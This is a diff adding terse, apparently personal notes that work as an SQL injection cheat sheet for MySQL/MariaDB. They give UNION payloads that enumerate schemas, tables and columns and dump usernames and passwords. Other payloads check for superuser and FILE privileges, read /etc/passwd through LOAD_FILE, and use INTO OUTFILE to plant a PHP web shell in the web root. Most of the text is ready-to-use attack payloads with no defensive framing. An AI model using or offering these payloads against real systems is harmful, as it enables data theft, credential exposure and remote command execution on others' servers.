@@ -1,0 +1,89 @@
+DATABASE ENUM:
+
+check if login is vuln:
+|
+|--- cn' <- breaks statment
+
+fingerprint db: <- use 'UNION SELECT 1,2,3,4 from yadayada
+|
+|--- select @@version <- full query is outputed
+|
+|--- select pow(1,1) <- only retive a int
+|
+|--- select sleep(7) <- not output(blind)
+
+tables present within the database:
+information_schema ----------+
+                             |
+                             |                             
+schemata: <------------------+
+|
+|--- info on the database
+|--- ' union select schema_name from information_schema.schemata-- -
+
+tables: <- before dumping data you'll have to query the tables in the db
+|
+|--- 'tables' holds info about all tables within a db. don't forget to fill the right amout of columns
+|
+|--- 'tables_schema' <- point at the db where each tables belongs
+|
+|--- 'table_name' <- stores table names
+|
+|--- ' union select 1,table_name,table_schema,4 from information_schema.tables where table_schema='{$table}'-- -
+|
+
+columns: <- before dumping, we need to find the column names in the table
+|
+|--- 'columns' can be used to find the columns and the info of all the columns in the table
+|
+|---  'UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='{$column}'-- -
+
+retv data:
+|
+|--- we got the info we need
+|
+|--- ' union select 1, {$user}, {$passwd}, 4 from {$database.table}-- -
+
+FILE READ:
+
+check for read priv: <- if the query returns 'Y', then yes we are super user
+|
+|--- check our user priv to see if we have super priv
+|
+|--- ' union select 1, super_priv, 3, 4 from mysql.user-- -
+|
+|--- or if we have many user
+|
+|--- ' union select 1, super_priv, 3, 4 from mysql.user where user='root'-- -
+|
+|--- grantee/privilege_type <- dumps other types of privleges(grantee is needed otherwise this won't work) 
+|
+|--- ' union select 1, grantee, privilege_type, 4 from information_schema.user_privileges-- -
+|
+|--- check for the word 'FILE', this means we can read files
+
+load da file:
+|
+|--- in mariaDB and MySQL the load_file() can be use to read files
+|
+|--- ' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+
+FILE WRITE:
+
+check secure_file_priv:
+|
+|--- secure_file_priv makes out where to read and write files from
+|
+|--- the MySQL has the variable 'secure_file_priv' in the table 'global_variables' in which that is in information schema
+|
+|--- the table has two columns; variable_name and variable_value
+|
+|--- ' union select variable_name, variable_value from information_schema.global_variables where variable_name="secure_file_priv"-- -
+|
+|--- the 'select into outfile' statement is used to write some data from the select query into a file
+|
+|--- ' union select "",'<?php system("dir /"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
+|
+|--- pay attention to the path, ex. path1/path2/path3
+|
+|--- certain paths restrict file read and write operations
